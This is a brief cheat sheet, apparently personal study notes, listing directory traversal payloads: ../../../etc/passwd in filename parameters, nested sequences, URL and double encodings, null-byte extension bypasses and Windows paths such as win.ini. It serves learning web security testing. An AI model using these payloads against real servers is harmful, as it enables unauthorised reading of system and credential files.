# Directory Traversal

#### `../` - known as sequence

#### Using API to fetch images/files&#x20;

* eg: `/loadimage?filename=219.png == var/www/images`&#x20;
* Change to filename `=../../../etc/passwd` (in url or POST body)&#x20;

#### Sequences are Stripped&#x20;

* Use nested sequence (`....//`, `..../`) --> Logic: inner stripping - `.."../"/` or `..".."/`)
* Use encodings, double encodings&#x20;
  * Url or non-standard (`..%c0%af`, `..%ef%bc%8f`)&#x20;
  * Payload list (Fuzzing - path traversal)
* Append without sequence (`/etc/passwd`)&#x20;

#### Requires the Filename to begin with Particular String&#x20;

* Use `var/www/images/../../../etc/passwd`&#x20;

#### Checks the File Extension&#x20;

* Use null byte (`%00`)&#x20;
* eg: `var/www/../../../etc/passwd%00.png`&#x20;

#### Windows OS

* &#x20;`../` and `..\` are valid
* Search for `/windows/win.ini`
